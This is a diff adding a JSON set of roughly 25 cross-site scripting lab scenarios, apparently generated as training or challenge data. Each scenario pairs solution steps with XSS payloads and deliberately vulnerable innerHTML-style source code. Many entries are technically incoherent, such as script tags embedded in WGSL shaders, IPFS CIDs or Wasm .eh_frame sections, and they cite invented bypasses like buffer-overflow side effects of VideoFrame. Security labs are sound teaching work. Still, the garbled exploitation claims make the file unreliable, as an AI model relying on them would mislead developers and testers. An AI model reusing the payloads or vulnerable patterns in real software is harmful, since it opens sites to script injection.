@@ -1,0 +1,466 @@
+[
+    {
+      "Lab scenario": "Stored XSS in Serverless Contact Form via Vercel Serverless Function",
+      "Lab Description": "A JAMstack site's contact form stores submissions in CosmosDB through an Azure Function that fails to sanitize Markdown-formatted messages. The application renders entries using dangerouslySetInnerHTML in Next.js. To solve: Inject XSS that triggers when customer service agents review submissions.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Intercept form submission using Burp Suite",
+        "Craft payload: [XSS](javascript&#58;alert`1`)",
+        "Bypass Markdown href sanitization using HTML entities",
+        "Exploit Next.js static regeneration caching mechanism",
+        "Verify through admin portal's message threading view"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "![AltText](x\"onerror=\"alert(1))",
+        "[Click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg)"
+      ],
+      "srcCode": "export default async function handler(req, res) {\n  await cosmos.items.create({ message: req.body.text });\n  res.status(200).json({ success: true });\n}"
+    },
+    {
+      "Lab scenario": "DOM XSS in Real-Time Code Collaboration Editor via Yjs CRDT",
+      "Lab Description": "A collaborative coding platform using Yjs framework inserts user cursor positions without proper escaping. The application syncs peer activities through WebSocket messages containing raw HTML. To solve: Exploit presence indicator updates to execute code in other collaborators' sessions.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Use OWASP ZAP to intercept WebSocket messages",
+        "Modify cursorPosition message: {\"user\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\",",
+        "Bypass CRDT conflict resolution using timestamp manipulation",
+        "Exploit Monaco Editor's trustedTypes policy bypass",
+        "Trigger through multi-cursor selection feature"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "{\"user\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\",\"pos\":0}",
+        "y.applyUpdate(doc, decodeUpdateFromBase64(\"<script>alert(1)</script>\"))"
+      ],
+      "srcCode": "yjsConnector.on('message', msg => {\n  document.getElementById('collab-users').innerHTML += \n    `<div>${msg.user} is editing</div>`;\n});"
+    },
+    {
+      "Lab scenario": "Mutation XSS in Jupyter Notebook Kernel Output Rendering",
+      "Lab Description": "A cloud-based Jupyter hub fails to sanitize DataFrame HTML outputs containing malicious SVG schemas. The application uses IPython's display() function with raw HTML rendering. To solve: Craft a pandas DataFrame that executes JavaScript when data scientists view cell outputs.",
+      "Difficulty Level": "Medium",
+      "Solution Steps": [
+        "Create malicious DataFrame: df.style.set_table_attributes('onmouseover=alert(1)')",
+        "Bypass IPython HTML sanitization using MathJax delimiters",
+        "Exploit Vega-Lite visualization injection points",
+        "Chain with notebook export to HTML feature",
+        "Verify through shared kernel sessions"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "pd.DataFrame({'data': ['<svg/onload=alert(1)>']})",
+        "%%html\n<script>alert(1)</script>"
+      ],
+      "srcCode": "from IPython.display import HTML\nHTML(df.to_html(escape=False))"
+    },
+    {
+      "Lab scenario": "Reflected XSS in Swagger UI via OAuth2 Redirect URL",
+      "Lab Description": "An API documentation portal's Swagger implementation reflects OAuth2 callback parameters without encoding. The application uses unsanitized window.location.hash parsing for auth token handling. To solve: Exploit the OAuth implicit flow to execute XSS in developers' API testing sessions.",
+      "Difficulty Level": "Easy",
+      "Solution Steps": [
+        "Modify authorization callback URL in Postman",
+        "Inject payload: #access_token=<script>alert(1)</script>",
+        "Bypass URL fragment validation using double encoding",
+        "Exploit Swagger UI's try-it-out feature rendering",
+        "Trigger through OAuth token validation error states"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "http://localhost/callback#error=<img/src=1 onerror=alert(1)>",
+        "redirect_uri=https%3A%2F%2Fattacker.com%2F%23%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+      ],
+      "srcCode": "const token = new URLSearchParams(window.location.hash.substr(1)).get('access_token');\ndocument.getElementById('token-display').innerHTML = token;"
+    },
+    {
+      "Lab scenario": "DOM XSS in WebAssembly Game Engine via Scoreboard Rendering",
+      "Lab Description": "A browser-based game using Unity WebGL exports player scores to DOM without validation. The application passes strings between Wasm memory and JS using insecure buffer copying. To solve: Manipulate highscore submission to execute script in other players' leaderboard views.",
+      "Difficulty Level": "Hard",
+      "Solution Steps": [
+        "Use Cheat Engine to modify WebAssembly memory values",
+        "Craft payload: Score: <iframe srcdoc='<script>parent.alert(1)</script>'></iframe>",
+        "Bypass UTF-8 validation using surrogate pairs",
+        "Exploit Unity's Application.ExternalCall handler",
+        "Trigger through global leaderboard refresh feature"
+      ],
+      "Vulnerability name": "Cross-site scripting",
+      "payloads": [
+        "Module.HEAPU8.set([60,115,99,114,105,112,116,62], bufferAddr);",
+        "UNITY_Loader.asmLibraryArg._UpdateScore('<img/src=1 onerror=alert(1)>')"
+      ],
+      "srcCode": "function updateScore(scorePtr) {\n  const score = UTF8ToString(scorePtr);\n  document.getElementById('score').innerHTML = score;\n}"
+    }
+    ,
+
+    
+        {
+          "Lab scenario": "DOM XSS in Web Bluetooth API Device Name Parsing",
+          "Lab Description": "A fitness tracking PWA scans nearby Bluetooth devices and displays names using innerHTML. The application caches device metadata in IndexedDB without validation. To solve: Spoof BLE device with XSS payload that executes when users view scan history.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Use BetterCAP to advertise malicious BLE device",
+            "Craft device name: <svg onload=alert(1)>",
+            "Bypass Bluetooth spec length limits using fragmented advertising packets",
+            "Exploit Web Bluetooth service UUID whitelisting bypass",
+            "Trigger through offline scan data synchronization"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "μ<iframe/src=javascript:alert(1)>", 
+            "HeartRateMonitor<script>alert(1)</script>"
+          ],
+          "srcCode": "navigator.bluetooth.requestDevice({filters: [{name: userSearchTerm}]})\n.then(device => {\n  document.getElementById('devices').innerHTML += `<li>${device.name}</li>`;\n});"
+        },
+        {
+          "Lab scenario": "Stored XSS in Shopify Theme Liquid Template Injection",
+          "Lab Description": "A Shopify store's custom theme uses unsafe {{ customer.metafield }} rendering. The application's Liquid template disables HTML escaping for promotional banners. To solve: Inject XSS through customer metadata that triggers on product page loads.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Modify customer metafields using Storefront API",
+            "Craft payload: {{ \"<script>\" }}alert(1){{ \"</script>\" }}",
+            "Bypass Liquid sanitization using capture tags",
+            "Exploit theme.liquid layout inheritance",
+            "Verify through draft order preview functionality"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "{% capture xss %}<script>alert(1)</script>{% endcapture %}{{ xss }}",
+            "{{ '<img src=x onerror='| append: 'alert(1)' }}"
+          ],
+          "srcCode": "<!-- theme.liquid -->\n<div class=\"banner\">\n  {{ customer.metafields.global.warning_message }}\n</div>"
+        },
+        {
+          "Lab scenario": "Mutation XSS in Apache Superset Dashboard Chart Annotations",
+          "Lab Description": "A business intelligence platform renders markdown annotations in Vega-Lite charts as HTML. The application's SQL Lab feature allows CSV exports with raw HTML. To solve: Craft malicious annotation that executes when analysts export to PDF.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Use SQL Lab to create table with XSS payload",
+            "Inject: <![CDATA[<svg onload=alert(1)>]]>",
+            "Bypass markdown-to-HTML conversion using nested iframes",
+            "Exploit Superset's SVG sanitizer allowlist",
+            "Trigger through scheduled report generation"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "ANNOTATE SET `<style><script>alert(1)</script></style>`",
+            "COMMENT ON COLUMN table IS '<!--<img src=-->'<script>alert(1)</script>'"
+          ],
+          "srcCode": "// superset_config.py\nFEATURE_FLAGS = {\n  \"ENABLE_TEMPLATE_PROCESSING\": True\n}"
+        },
+        {
+          "Lab scenario": "DOM XSS in Web Serial API Thermal Printer Emulation",
+          "Lab Description": "An industrial control system web app interacts with serial devices using Web Serial API. The application renders received Uint8Array data as text/html. To solve: Spoof thermal printer output containing XSS that executes in maintenance interface.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Use OWASP ZAP to intercept Web Serial traffic",
+            "Craft payload: <marquee loop=1 onfinish=alert(1)>",
+            "Bypass UTF-8 decoding errors using overlong encodings",
+            "Exploit serial port read/write permissions",
+            "Trigger through automated device diagnostics report"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "new TextEncoder().encode('<script>alert(1)</script>')",
+            "Uint8Array.from([60,115,99,114,105,112,116,62])"
+          ],
+          "srcCode": "const reader = port.readable.getReader();\nwhile (true) {\n  const { value } = await reader.read();\n  document.getElementById('output').innerHTML += new TextDecoder().decode(value);\n}"
+        },
+        {
+          "Lab scenario": "Stored XSS in Matter.js Physics Engine Metadata",
+          "Lab Description": "A phygital game uses Matter.js physics engine to sync DOM elements with rigid bodies. The application stores sprite metadata in LocalStorage without validation. To solve: Manipulate collision boundaries to inject XSS that triggers on object impacts.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Modify sprite JSON definition using browser Storage inspector",
+            "Inject payload: \"label\":\"<img src=1 onerror=alert(1)>\",",
+            "Bypass velocity validation using exponential notation",
+            "Exploit Composite.add() method for DOM injection",
+            "Trigger through multiplayer collision events"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "Matter.Bodies.rectangle(400, 200, 80, 80, { render: { label: '<svg/onload=alert(1)>' } })",
+            "{\"type\":\"body\",\"label\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}"
+          ],
+          "srcCode": "Matter.World.add(engine.world, [\n  Matter.Bodies.rectangle(400, 610, 810, 60, { \n    render: {\n      fillStyle: '#transparent',\n      text: userData.label\n    }\n  })\n]);"
+        }
+       ,
+
+       
+        {
+          "Lab scenario": "DOM XSS in WebXR Hand Tracking Visualization",
+          "Lab Description": "An AR fitness app renders hand joint positions using Three.js without sanitizing debug panel outputs. The application converts WebXR joint data to SVG visualizations using innerHTML. To solve: Manipulate hand tracking data to inject XSS that triggers during gesture recognition calibration.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Use WebXR emulator to spoof hand positions",
+            "Craft payload: joint.radius = \"<img src=x onerror=alert('XR_SESSION')>\",",
+            "Bypass quaternion validation using NaN poisoning",
+            "Exploit WebGL shader error handling",
+            "Trigger through shared AR workout sessions"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "handedness: '\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E'",
+            "<details open ontoggle=alert(1)>"
+          ],
+          "srcCode": "function renderHands(hands) {\n  const svg = hands.map(h => \n    `<circle cx=\"${h.x}\" cy=\"${h.y}\" r=\"${h.radius}\"/>`);\n  document.getElementById('debug').innerHTML = svg.join('');\n}"
+        },
+        {
+          "Lab scenario": "Stored XSS in ProseMirror Collaborative Document Version History",
+          "Lab Description": "A legal document editing platform stores ProseMirror JSON content states without sanitizing version diffs. The application renders document history using dangerouslySetInnerHTML. To solve: Inject XSS through track changes metadata that executes when lawyers compare document versions.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Intercept WebSocket document update messages",
+            "Craft payload: {\"type\":\"text\",\"marks\":[{\"type\":\"comment\",\"attrs\":{\"id\":\"<script>alert(1)</script>\"}}]}",
+            "Bypass Prosemirror schema validation using mark nesting",
+            "Exploit sharedb operational transformation conflicts",
+            "Verify through PDF export comment rendering"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "{\"node\":{\"type\":\"text\",\"text\":\"clause\",\"marks\":[{\"type\":\"onclick\",\"attrs\":{\"action\":\"alert(1)\"}}]}}",
+            "<!--<script>alert(1)</script>-->"
+          ],
+          "srcCode": "const state = prosemirrorStateFromJSON(schema, req.body.content);\ndocument.getElementById('version-diff').innerHTML = \n  renderDiff(previousState, state);"
+        },
+        {
+          "Lab scenario": "Mutation XSS in Web NFC Tag Data Parsing",
+          "Lab Description": "A museum exhibit guide PWA reads NFC tags containing exhibit metadata without sanitizing NDEF records. The application processes text records as HTML in the info panel. To solve: Spoof NFC tag containing XSS payload that triggers when visitors scan exhibit markers.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Use Flipper Zero to write malicious NFC tags",
+            "Craft NDEF record: <noscript><p style=\"animation: x\"></noscript><img src=x onanimationstart=alert(1)>",
+            "Bypass NDEF type validation using mixed UTF-16 encoding",
+            "Exploit Chrome's NFC scanning background tab behavior",
+            "Trigger through exhibit tour auto-play feature"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "nfc.write({ records: [{ recordType: 'text', data: '<svg/onload=alert(1)>' }]});",
+            "document\\u002Ewrite\\u0028'<script>alert\\u00281\\u0029</script>'\\u0029"
+          ],
+          "srcCode": "navigator.nfc.watch(msg => {\n  const text = new TextDecoder().decode(msg.records[0].data);\n  exhibitInfoEl.innerHTML = text;\n});"
+        },
+        {
+          "Lab scenario": "DOM XSS in VSCode Web Extension Markdown Preview",
+          "Lab Description": "A VSCode web extension renders GitHub-flavored markdown using insecure reveal.js configuration. The application loads untrusted markdown files with disabled Content Security Policy. To solve: Craft markdown file that executes XSS when previewed in the web-based editor.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Create malicious .md file with SVG payload",
+            "Bypass sanitizer using mermaid diagram injection: ```mermaid\nflowchart LR\nA[<script>alert(1)</script>]",
+            "Exploit reveal.js fragment navigation events",
+            "Chain with workspace trust API misconfiguration",
+            "Trigger through extension host process bridging"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj48L3N2Zz4=)",
+            "```html\n<iframe srcdoc='<script>parent.alert(1)</script>'>\n```"
+          ],
+          "srcCode": "vscode.markdown.registerMarkdownPreviewProvider('md', {\n  provideTextDocumentContent(uri) {\n    return marked.parse(fs.readFileSync(uri.fsPath));\n  }\n});"
+        },
+        {
+          "Lab scenario": "Stored XSS in OpenTelemetry Span Metadata Visualization",
+          "Lab Description": "An observability platform renders OpenTelemetry span attributes as HTML tooltips. The application ingests tracing data without sanitizing span metadata. To solve: Inject XSS through Jaeger tracer configuration that executes when SREs inspect production traces.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Modify span attributes using OpenTelemetry SDK",
+            "Craft payload: span.setAttribute('error.stack', '<img src=x onerror=alert(1)>')",
+            "Bypass OTLP exporter validation using protobuf field wrapping",
+            "Exploit Grafana Tempo trace detail view rendering",
+            "Trigger through automated anomaly detection alerts"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "span.addEvent('<script>alert(1)</script>')",
+            "{\"attributes\": {\"error.message\": \"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}}"
+          ],
+          "srcCode": "app.get('/trace/:id', async (req, res) => {\n  const trace = await tracer.get(req.params.id);\n  res.render('trace-view', { spans: trace.spans });\n});"
+        }
+       ,
+
+       
+        {
+          "Lab scenario": "DOM XSS in WebHID Gamepad Vibration API",
+          "Lab Description": "A retro gaming emulator site implements custom force feedback using WebHID. The application parses gamepad button mappings from JSON configs without sanitizing device labels. To solve: Inject XSS through malicious controller config that executes during rumble effect rendering.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Intercept WebHID device selection request with Burp",
+            "Craft payload: {\"label\":\"<iframe srcdoc='<script>parent.alert(1)</script>'\", ...}",
+            "Bypass HID usage page validation using reserved vendor codes",
+            "Exploit GamepadHapticActuator.playEffect() timing attacks",
+            "Trigger through saved controller profile sharing"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "{\"collections\":[{\"usagePage\":\"0xff0b\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}]}",
+            "navigator.hid.requestDevice({filters:[{vendorId:0x0, productName:'<svg/onload=alert(1)>'}]})"
+          ],
+          "srcCode": "const device = await navigator.hid.requestDevice();\ndocument.getElementById('device-label').innerHTML = device.productName;"
+        },
+        {
+          "Lab scenario": "Stored XSS in Jitsi Meet Virtual Background WebGL Shader",
+          "Lab Description": "A video conferencing platform's virtual background feature processes custom images through Three.js shaders. The application stores user-uploaded GLSL shaders without validation. To solve: Inject XSS through malicious fragment shader that executes when participants enable background effects.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Upload crafted .glsl file with precision mediump float;<script>alert(1)</script>",
+            "Bypass MIME type validation using shader include directives",
+            "Exploit WebGL2RenderingContext.getShaderInfoLog() output",
+            "Chain with iframe sandbox bypass using allow-scripts",
+            "Verify through meeting recording playback"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "#extension GL_GOOGLE_include_directive : require\n#include<svg/onload=alert(1)>",
+            "precision highp float;\n//</script><svg/onload=alert(1)>"
+          ],
+          "srcCode": "const shader = gl.createShader(gl.FRAGMENT_SHADER);\ngl.shaderSource(shader, userCode);\ngl.compileShader(shader);\ndocument.getElementById('shader-errors').innerHTML = gl.getShaderInfoLog(shader);"
+        },
+        {
+          "Lab scenario": "Mutation XSS in WebTransport Unreliable Datagram Metadata",
+          "Lab Description": "A real-time sports betting app uses WebTransport unreliable datagrams for odds updates. The application renders message headers in debug panels using innerHTML. To solve: Craft datagram packets with XSS payloads that execute when traders inspect network traffic.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Use Wireshark with QUIC dissector to intercept datagrams",
+            "Construct payload: new Uint8Array([60,115,99,114,...]) // <script>...",
+            "Bypass message framing validation using partial chunks",
+            "Exploit datagram out-of-order delivery race conditions",
+            "Trigger through admin interface packet capture feature"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "const writer = transport.datagrams.writable.getWriter();\nwriter.write(new TextEncoder().encode('<script>alert(1)</script>'));",
+            "new Uint8Array([0x3c, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x3e])"
+          ],
+          "srcCode": "const reader = transport.datagrams.readable.getReader();\nwhile (true) {\n  const { value } = await reader.read();\n  debugPanel.innerHTML += new TextDecoder().decode(value);\n}"
+        },
+        {
+          "Lab scenario": "DOM XSS in WebCodecs VideoFrame Metadata Processing",
+          "Lab Description": "A video editing PWA uses WebCodecs API to analyze footage. The application displays frame metadata in SVG timelines without escaping. To solve: Inject XSS through crafted video timestamp metadata that executes during clip scrubbing.",
+          "Difficulty Level": "Hard",
+          "Solution Steps": [
+            "Use FFmpeg to inject malicious metadata: -metadata comment=\"<script>alert(1)</script>\"",
+            "Bypass codec validation using fragmented MP4 with XSS payload",
+            "Exploit VideoFrame.allocationSize() buffer overflow side effects",
+            "Chain with OffscreenCanvas.textMetrics vulnerabilities",
+            "Trigger through video annotation export feature"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "new VideoFrame(new Uint8Array([60,115,99,114,105,112,116,62]), { metadata: { xss: \"<svg/onload=alert(1)>\" } });",
+            "document\\u002Ewrite\\u0028'\\u003Cscript\\u003Ealert\\u00281\\u0029\\u003C/script\\u003E'\\u0029"
+          ],
+          "srcCode": "const decoder = new VideoDecoder({\n  output: frame => {\n    timelineSVG.innerHTML += `<text x=\"${frame.timestamp}\">${frame.metadata.comment}</text>`;\n  }\n});"
+        },
+        {
+          "Lab scenario": "Stored XSS in Deno Fresh Islands Hydration Mismatch",
+          "Lab Description": "A Deno Fresh blog platform passes props to islands components without serialization checks. The application's server-rendered HTML mismatches client-side hydration. To solve: Craft blog post that injects XSS through island prop deserialization.",
+          "Difficulty Level": "Medium",
+          "Solution Steps": [
+            "Create markdown file with: <MyIsland data={{ __proto__: \"<script>alert(1)</script>\" }} />",
+            "Bypass JSX sanitization using Deno.serve() handler injection",
+            "Exploit hydration mismatch between server/client render",
+            "Chain with Deno KV store metadata leaks",
+            "Verify through static site regeneration"
+          ],
+          "Vulnerability name": "Cross-site scripting",
+          "payloads": [
+            "<is-land data-props='{\"content\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}'>",
+            "export const data = { props: { title: \"</script><svg/onload=alert(1)>\" } };"
+          ],
+          "srcCode": "// islands/MyIsland.tsx\nexport default function MyIsland(props) {\n  return <div dangerouslySetInnerHTML={{ __html: props.data }} />;\n}"
+        }
+
+        ,
+        
+            {
+              "Lab scenario": "DOM XSS in WebGPU Compute Shader Debug Output",
+              "Lab Description": "A cryptocurrency mining visualizer renders WebGPU shader compilation errors using innerHTML. The application passes compute pipeline metadata to DOM without sanitization. To solve: Craft a shader with XSS payload that executes during pipeline validation failures.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Write malicious WGSL shader: @compute @workgroup_size(<script>alert(1)</script>)",
+                "Bypass WGSL syntax validation using comment injections",
+                "Exploit GPUCompilationInfo.message concatenation",
+                "Chain with error visualization WebGL overlay",
+                "Trigger through automated benchmark tests"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                "const code = `@vertex fn vs_main() -> @builtin(position) vec4<f32> { return vec4<f32>(alert(1)); }`;",
+                "/*</script><svg/onload=alert(1)>*/"
+              ],
+              "srcCode": "const adapter = await navigator.gpu.requestAdapter();\nconst device = await adapter.requestDevice();\nconst shaderModule = device.createShaderModule({ code: userCode });\ndocument.getElementById('errors').innerHTML = shaderModule.compilationInfo.messages;"
+            },
+            {
+              "Lab scenario": "Stored XSS in WebNN Model Metadata via Tensor Serialization",
+              "Lab Description": "An AI art platform stores ML model metadata in IndexedDB without validation. The application renders ONNX model descriptions as HTML in gallery view. To solve: Inject XSS through model quantization parameters that execute when users browse generated artwork.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Modify ONNX model proto text_format field",
+                "Craft payload: description: \"<img src=x onerror=alert('MODEL_EXFIL')>\",",
+                "Bypass protobuf encoding checks using tensor splices",
+                "Exploit WebNN's context.release() memory timing",
+                "Trigger through model conversion worker threads"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                "{\"metadata\":{\"author\":\"\\u003Cscript\\u003Ealert(1)\\u003C/script\\u003E\"}}",
+                "new Float32Array([60,115,99,114,105,112,116,62]) // <script>"
+              ],
+              "srcCode": "const builder = new MLGraphBuilder(context);\nconst desc = {name: userModel.metadata.author};\nconst output = builder.input('input', desc);\ndocument.getElementById('model-info').innerHTML = output.name;"
+            },
+            {
+              "Lab scenario": "Mutation XSS in IPFS Immutable Content Addressing via CIDv1",
+              "Lab Description": "A decentralized social network renders IPFS-hosted posts using raw CIDv1 resolution. The application converts multibase encoded CIDs to HTML without escaping. To solve: Craft CID containing XSS payload that persists through IPFS pinning.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Generate malicious CID: base36.encode('<script>alert(1)</script>')",
+                "Bypass multibase prefix validation using z-base-32",
+                "Exploit libp2p pubsub message propagation",
+                "Chain with IPNS record TTL expiration",
+                "Trigger through gateway URL normalization"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                "bafybei<script>alert(1)</script>",
+                "k51qzi5uqu5d<script>alert(1)</script>"
+              ],
+              "srcCode": "async function loadPost(cid) {\n  const content = await ipfs.cat(cid);\n  document.getElementById('post').innerHTML = content;\n}"
+            },
+            {
+              "Lab scenario": "DOM XSS in Web Container Filesystem /proc Access",
+              "Lab Description": "A browser-based IDE using WebContainers mounts /proc/self/environ as world-readable. The application displays environment variables in debug console without sanitization. To solve: Inject XSS through NODE_OPTIONS that executes when developers inspect runtime config.",
+              "Difficulty Level": "Medium",
+              "Solution Steps": [
+                "Set process.env.NODE_OPTIONS = \"--title=<script>alert(1)</script>\"",
+                "Bypass webcontainer filesystem sandboxing",
+                "Exploit SharedArrayBuffer timing attacks",
+                "Chain with service worker registration",
+                "Trigger through live collaboration sessions"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                "NODE_OPTIONS='--title=\"</script><svg/onload=alert(1)>\"'",
+                "env: {WEB_CONTAINER: \"data:text/html,<script>alert(1)</script>\"}"
+              ],
+              "srcCode": "const webcontainer = await WebContainer.boot();\nawait webcontainer.mount({ '/proc': createProcMount() });\ndocument.getElementById('env').innerHTML = await webcontainer.fs.readFile('/proc/self/environ');"
+            },
+            {
+              "Lab scenario": "WebAssembly Exception Handling Hijack via EH_FRAME",
+              "Lab Description": "A financial modeling tool loads untrusted Wasm modules with exception handling enabled. The application renders unwind info using innerHTML in debug panels. To solve: Craft Wasm module with malicious .eh_frame section that triggers XSS during stack unwinding.",
+              "Difficulty Level": "Hard",
+              "Solution Steps": [
+                "Compile Rust code with #[link_section = \".eh_frame\"]",
+                "Inject payload: .string \"<script>alert('WASM_PWN')</script>\"",
+                "Bypass Wasm validation using custom Dwarf CFI",
+                "Exploit stack trace symbol resolution",
+                "Trigger through panic hook visualization"
+              ],
+              "Vulnerability name": "Cross-site scripting",
+              "payloads": [
+                ".section .eh_frame,\"a\",@progbits\n.string \"<script>alert(1)</script>\"",
+                "local.get 0\ntry (param i32)\ncatch_all\nunreachable\nend"
+              ],
+              "srcCode": "const module = await WebAssembly.compile(userBuffer);\nconst excinfo = WebAssembly.Module.customSections(module, '.eh_frame');\ndocument.getElementById('exceptions').innerHTML = \n  new TextDecoder().decode(excinfo[0]);"
+            }
+          
+      
+  ]
